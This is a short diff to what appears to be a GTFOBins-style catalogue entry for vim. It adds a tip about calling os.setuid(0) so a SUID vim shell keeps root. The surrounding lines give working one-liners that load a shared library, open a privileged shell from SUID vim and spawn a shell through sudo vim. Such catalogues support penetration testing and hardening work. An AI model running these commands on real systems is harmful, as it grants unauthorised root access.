@@ -105,7 +105,7 @@ functions:
     - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
       code: vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'
   suid:
-    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.
+    - description: This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Insert `os.setuid(0);` to retain root permissions.
       code: ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
   sudo:
     - code: sudo vim -c ':!/bin/sh'
